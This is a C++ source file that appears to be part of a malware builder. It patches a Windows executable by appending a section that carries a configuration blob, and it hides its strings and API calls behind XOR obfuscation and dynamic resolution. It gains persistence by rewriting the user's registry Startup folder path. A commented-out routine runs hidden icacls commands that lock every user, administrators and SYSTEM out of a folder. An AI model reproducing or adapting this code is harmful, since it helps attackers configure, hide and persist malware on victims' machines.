#include "Module.h"

DWORD Module::CFile::Align(DWORD size, DWORD align, DWORD addr) const
{
	try
	{
		if (!(size % align))
			return addr + size;
		return addr + (size / align + 1) * align;
	}
	catch (...) { return 0; }
}

Module::CFile::CFile(const string & sFileName)
{
	try
	{
		if (file().Exists(sFileName))
		{
			char* kernel32 = XOR("Kernel32.dll");
			this->hFile = FNC(CreateFileA, kernel32)(sFileName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			if (this->hFile != INVALID_HANDLE_VALUE)
			{
				DWORD dwTemp = 0;
				DWORD dwFileSize = FNC(GetFileSize, kernel32)(this->hFile, &dwTemp);
				if (dwFileSize != 0)
				{
					byte* bFileData = new byte[dwFileSize];
					byte* pOrigFileData = bFileData;
					if (FNC(ReadFile, kernel32)(this->hFile, (LPVOID)bFileData, dwFileSize, &dwTemp, NULL))
					{
						while (dwTemp--)
						{
							this->vecFile.push_back(*bFileData);
							bFileData++;
						}

						delete[] pOrigFileData;
					}
				}
			}
		}
	}
	catch (...) { return; }
}

Module::CFile::~CFile()
{
	try
	{
		FNC(CloseHandle, XOR("Kernel32.dll"))(hFile);
	}
	catch (...) { return; }
}

bool Module::CFile::AddSection(const string & sName, const vector<byte> & vecData)
{
	try
	{
		if (sName.size() <= XorInt(8))
		{
			if (!this->vecFile.empty() && this->IsFileValid())
			{
				char* kernel32 = XOR("Kernel32.dll");

				void* pData = (void*)this->vecFile.data();
				PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pData;
				PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD)pData + pDos->e_lfanew);
				PIMAGE_FILE_HEADER pFile = &pNt->FileHeader;
				PIMAGE_OPTIONAL_HEADER pOpt = &pNt->OptionalHeader;
				PIMAGE_SECTION_HEADER pSect = IMAGE_FIRST_SECTION(pNt);

				memcpy((void*)&pSect[pFile->NumberOfSections].Name, sName.c_str(), sName.size());

				DWORD dwSectionSize = vecData.size() + sizeof(DWORD) + sizeof(IMAGE_SECTION_HEADER);
				pSect[pFile->NumberOfSections].Misc.VirtualSize = Align(dwSectionSize, pOpt->SectionAlignment, 0);
				pSect[pFile->NumberOfSections].VirtualAddress = Align(pSect[pFile->NumberOfSections - 1].Misc.VirtualSize,
					pOpt->SectionAlignment, pSect[pFile->NumberOfSections - 1].VirtualAddress);
				pSect[pFile->NumberOfSections].SizeOfRawData = Align(dwSectionSize, pOpt->FileAlignment, 0);
				pSect[pFile->NumberOfSections].PointerToRawData = Align(pSect[pFile->NumberOfSections - 1].SizeOfRawData,
					pOpt->FileAlignment, pSect[pFile->NumberOfSections - 1].PointerToRawData);
				pSect[pFile->NumberOfSections].Characteristics = XorInt(IMAGE_SCN_CNT_INITIALIZED_DATA) | XorInt(IMAGE_SCN_MEM_READ);

				DWORD dwEOF = pSect[pFile->NumberOfSections].PointerToRawData + pSect[pFile->NumberOfSections].SizeOfRawData, dwTemp = 0;
				if (FNC(SetFilePointer, kernel32)(this->hFile, dwEOF, NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
				{
					if (FNC(SetEndOfFile, kernel32)(this->hFile))
					{
						pOpt->SizeOfImage = pSect[pFile->NumberOfSections].VirtualAddress + pSect[pFile->NumberOfSections].Misc.VirtualSize;
						pFile->NumberOfSections++;
						if (FNC(SetFilePointer, kernel32)(this->hFile, 0, NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
						{
							if (FNC(WriteFile, kernel32)(this->hFile, this->vecFile.data(), this->vecFile.size(), &dwTemp, NULL))
							{
								if (FNC(SetFilePointer, kernel32)(this->hFile, pSect[pFile->NumberOfSections - 1].PointerToRawData,
									NULL, XorInt(FILE_BEGIN)) != INVALID_SET_FILE_POINTER)
								{
									DWORD dwVecSize = vecData.size();
									if (FNC(WriteFile, kernel32)(this->hFile, &dwVecSize, XorInt(4), &dwTemp, NULL))
									{
										if (FNC(WriteFile, kernel32)(this->hFile, vecData.data(), vecData.size(), &dwTemp, NULL))
											return true;
									}
								}
							}
						}
					}
				}
			}
		}

		return false;
	}
	catch (...) { return false; }
}

bool Module::CFile::IsFileValid()
{
	try
	{
		if (!this->vecFile.empty())
		{
			void* pData = (void*)this->vecFile.data();
			PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pData;
			if (pDos->e_magic == IMAGE_DOS_SIGNATURE)
			{
				PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD)pData + pDos->e_lfanew);
				if (pNt->Signature == IMAGE_NT_SIGNATURE)
				{
					PIMAGE_OPTIONAL_HEADER pOpt = &pNt->OptionalHeader;
					PIMAGE_DATA_DIRECTORY pRelEntry = &pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
					if (pOpt->AddressOfEntryPoint)
					{
						//if (pRelEntry->VirtualAddress)
							return true;
					}
				}
			}
		}
		return false;
	}
	catch (...) { return false; }
}

Module::Module(const string & path, const string & settings)
{
	try
	{
		CFile* cFile = new CFile(path);
		if (cFile)
		{
			if (cFile->IsFileValid())
			{
				vector<byte> query;
				for (size_t i = 0; i < settings.size(); ++i)
					query.push_back(settings[i]);
				cFile->AddSection(XOR(".rdata"), query);
			}

			delete cFile;
		}
	}
	catch (...) { return; }
}

void Module::RegistryPersistance(const string & dir)
{
	try
	{
		char* advapi = XOR("Advapi32.dll");

		HKEY key;
		LSTATUS status;
		status = FNC(RegOpenKeyA, advapi)
			(HKEY_CURRENT_USER, XOR("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"), &key);
		if (status != ERROR_SUCCESS || !key)
			return;

		status = FNC(RegSetValueExA, advapi)(key, XOR("Startup"), 0, REG_EXPAND_SZ, (BYTE*)dir.c_str(), dir.size());
		if (status != ERROR_SUCCESS)
			return;

		FNC(RegCloseKey, advapi)(key);
	}
	catch (...) { return; }
}

void Module::FolderPersistance(const string & dir)
{
	try
	{
		/*
		const string init = XOR("/c icacls \"") + dir;

		PROTO_ShellExecuteA pShellExecuteA = FNC(ShellExecuteA, XOR("Shell32.dll"));
		if (pShellExecuteA)
		{
			char* command = XOR("open");
			char* cmd = getenv(XOR("ComSpec"));
			if (cmd)
			{
				pShellExecuteA(0, command, cmd,
					(string(init + XOR("\" /inheritance:e /deny \"*S-1-1-0:(R,REA,RA,RD)\" \"*S-1-5-7:(R,REA,RA,RD)\""))).c_str(), 0, SW_HIDE);
				pShellExecuteA(0, command, cmd,
					(string(init + XOR("\" /inheritance:e /deny \"SYSTEM:(R,REA,RA,RD)\""))).c_str(), 0, SW_HIDE);
				pShellExecuteA(0, command, cmd,
					(string(init + XOR("\" /inheritance:e /deny \"Administrators:(R,REA,RA,RD)\""))).c_str(), 0, SW_HIDE);
				pShellExecuteA(0, command, cmd,
					(string(init + XOR("\" /inheritance:e /deny \"Users:(R,REA,RA,RD)\""))).c_str(), 0, SW_HIDE);

				char* username = getenv(XOR("username"));
				if (username)
					pShellExecuteA(0, command, cmd,
					(string(init + XOR("\" /inheritance:e /deny \"") + (string)username + XOR(":(R,REA,RA,RD)\""))).c_str(), 0, SW_HIDE);
			}
		}*/
	}
	catch (...) { return; }
}
